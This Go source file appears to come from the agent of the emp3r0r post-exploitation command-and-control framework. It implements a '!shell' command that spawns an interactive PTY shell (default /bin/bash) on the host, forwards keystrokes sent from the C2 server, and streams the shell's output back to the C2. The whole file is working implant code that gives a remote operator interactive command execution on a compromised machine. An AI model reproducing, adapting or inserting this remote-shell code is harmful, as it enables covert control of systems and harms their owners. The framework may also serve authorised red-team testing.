package handler

import (
	"strconv"
	"strings"

	"github.com/spf13/cobra"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

// shellCmdRun implements `!shell` — an interactive PTY shell session.
// Subcommands are selected via flags:
//
//	!shell -s [--shell /bin/bash]    start a new session (JobID == session id)
//	!shell -i <data>                  write input to the session
//	!shell -r <rows>x<cols>           resize the session PTY
//	!shell -k                         kill the session
func shellCmdRun(cmd *cobra.Command, args []string) {
	start, _ := cmd.Flags().GetBool("start")
	kill, _ := cmd.Flags().GetBool("kill")
	input, _ := cmd.Flags().GetString("input")
	resize, _ := cmd.Flags().GetString("resize")
	shellPath, _ := cmd.Flags().GetString("shell")
	jobID, _ := cmd.Flags().GetString("job_id")
	if shellPath == "" {
		shellPath = "/bin/bash"
	}

	switch {
	case start:
		startShellSession(cmd, jobID, shellPath)
	case kill:
		killShellSession(cmd, jobID)
	case input != "":
		sendShellInput(cmd, jobID, input)
	case resize != "":
		resizeShellSession(cmd, jobID, resize)
	default:
		c2transport.NotifyC2(cmd, "shell: no action specified (use -s/-i/-r/-k)")
	}
}

// startShellSession creates a new PTY session and starts streaming output.
func startShellSession(cmd *cobra.Command, jobID, shellPath string) {
	if jobID == "" {
		c2transport.NotifyC2(cmd, "shell: missing job_id (session id)")
		return
	}
	if _, exists := PtySessions.Load(jobID); exists {
		c2transport.NotifyC2(cmd, "shell: session %s already exists", jobID)
		return
	}
	s, err := NewPtySession(jobID, shellPath, nil)
	if err != nil {
		c2transport.NotifyC2(cmd, "shell: failed to start %s: %v", shellPath, err)
		return
	}
	// Stream output back to C2 with the same JobID. NotifyC2 is safe to call
	// repeatedly — each call produces one MsgTunData frame that the CC
	// broadcasts to web clients in order.
	go func() {
		s.StreamOutput(func(chunk []byte) {
			notifyPtyOutput(cmd, jobID, chunk)
		})
	}()
	c2transport.NotifyC2(cmd, "shell: session %s started (%s)", jobID, shellPath)
	logging.Infof("PTY session %s started (%s)", jobID, shellPath)
}

// notifyPtyOutput sends one frame of PTY output with the session's JobID.
// Build a fresh cobra.Command each time so concurrent frames never race on flags.
func notifyPtyOutput(_ *cobra.Command, jobID string, data []byte) {
	out := def.MsgTunData{
		Tag:       "",
		AgentUUID: "",
		CmdSlice:  []string{"shell"},
		JobID:     jobID,
		Response:  data,
	}
	// Tag/AgentUUID/signature set inside NotifyC2Binary; use the low-level path
	// so we can stream raw bytes without %-formatting.
	if err := c2transport.NotifyC2Raw(&out); err != nil {
		logging.Debugf("notifyPtyOutput: %v", err)
	}
}

// sendShellInput forwards keystrokes to the session's PTY master.
func sendShellInput(cmd *cobra.Command, jobID, input string) {
	if jobID == "" {
		c2transport.NotifyC2(cmd, "shell: missing job_id")
		return
	}
	val, ok := PtySessions.Load(jobID)
	if !ok {
		c2transport.NotifyC2(cmd, "shell: session %s not found", jobID)
		return
	}
	s := val.(*PtySession)
	if err := s.WriteInput([]byte(input)); err != nil {
		c2transport.NotifyC2(cmd, "shell: write failed: %v", err)
	}
}

// resizeShellSession updates the PTY window size.
func resizeShellSession(cmd *cobra.Command, jobID, dims string) {
	parts := strings.SplitN(dims, "x", 2)
	if len(parts) != 2 {
		c2transport.NotifyC2(cmd, "shell: bad resize format, want <rows>x<cols>")
		return
	}
	rows, err1 := strconv.ParseUint(parts[0], 10, 16)
	cols, err2 := strconv.ParseUint(parts[1], 10, 16)
	if err1 != nil || err2 != nil {
		c2transport.NotifyC2(cmd, "shell: bad resize dims %q", dims)
		return
	}
	val, ok := PtySessions.Load(jobID)
	if !ok {
		c2transport.NotifyC2(cmd, "shell: session %s not found", jobID)
		return
	}
	s := val.(*PtySession)
	if err := s.Resize(uint16(rows), uint16(cols)); err != nil {
		c2transport.NotifyC2(cmd, "shell: resize failed: %v", err)
	}
}

// killShellSession terminates the session, then notifies completion.
func killShellSession(cmd *cobra.Command, jobID string) {
	val, ok := PtySessions.Load(jobID)
	if !ok {
		c2transport.NotifyC2(cmd, "shell: session %s not found", jobID)
		return
	}
	val.(*PtySession).Close()
	c2transport.NotifyC2(cmd, "shell: session %s closed", jobID)
}

// registerShellCmd adds the !shell command to the replication-safe root.
func registerShellCmd(root *cobra.Command) {
	shellCmd := &cobra.Command{
		Use:     def.C2CmdShell,
		Short:   "Interactive PTY shell session",
		Example: "!shell -s; !shell -i 'ls\\n'; !shell -r 24x80; !shell -k",
		GroupID: "generic",
		Run:     shellCmdRun,
	}
	shellCmd.Flags().BoolP("start", "s", false, "Start a new shell session")
	shellCmd.Flags().BoolP("kill", "k", false, "Kill the shell session")
	shellCmd.Flags().StringP("input", "i", "", "Write input to the session (\\n literal ok)")
	shellCmd.Flags().StringP("resize", "r", "", "Resize session PTY: <rows>x<cols>")
	shellCmd.Flags().StringP("shell", "", "/bin/bash", "Shell binary to start")
	root.AddCommand(shellCmd)
}